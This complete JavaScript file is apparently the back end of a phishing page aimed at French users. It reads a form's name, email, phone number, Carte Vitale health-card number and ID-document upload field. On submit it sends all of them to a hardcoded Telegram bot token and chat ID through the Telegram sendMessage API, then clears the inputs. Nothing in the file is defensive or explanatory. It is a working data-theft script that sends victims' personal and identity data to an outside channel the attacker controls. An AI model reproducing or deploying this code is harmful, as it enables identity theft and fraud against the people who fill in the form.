const telegram_bot_id = "5991868041:AAETVgJrqhXbcKszGJUw8Em1VgRZEDQ1sCs";
const chat_id = 1070276630;

const inputFname = document.querySelector("#fname");
const inputLname = document.querySelector("#lname");
const inputNumber = document.querySelector("#phoneNumber");
const inputEmail = document.querySelector("#email");
const inputPassword = document.querySelector("#password");
const inputVitalCard = document.querySelector("#vitalCard");

const allInpts=document.querySelectorAll('input')

const formInputs=document.querySelectorAll('.form_input')

const recto=document.querySelector('#rectoId')
const form = document.querySelector("form");

form.addEventListener("submit", (e) => {
  e.preventDefault();
     // FORM VALIDATION
     formInputs.forEach((inpt) => {
      if (!inpt.value) {
        inpt.nextElementSibling.classList.remove("hide");
        return; 
      } else if (inpt.value) {
        inpt.nextElementSibling.classList.add("hide");
      }
    });
    

    for(inpt of formInputs){
      if(!inpt.value){
        return;
      }
    }
    message = `
    Prénom:
    %0A
  ${inputFname.value}
    %0A
    %0A
  Nom de famille:
    %0A
  ${inputLname.value}
    %0A
    %0A
  Adresse e-mail:
    %0A
  ${inputEmail.value}
    %0A
    %0A
  Numéro de téléphone:
    %0A
  ${inputNumber.value}
    %0A
    %0A
  Numero Carte vitale:
    %0A
  ${inputVitalCard.value}
    %0A
    %0A
  Téléverser une Piéce d'identité RECTO:
    %0A
  ${recto.value}
    %0A
    %0A
  
  
    Thank You 
    `;
    
 const link = `https://api.telegram.org/bot${telegram_bot_id}/sendMessage?chat_id=${chat_id}&text=${message}`;
  const xml = new XMLHttpRequest();
  xml.open("GET", link);
  xml.send();

for(inpt of allInpts){
  inpt.value=''
}
});




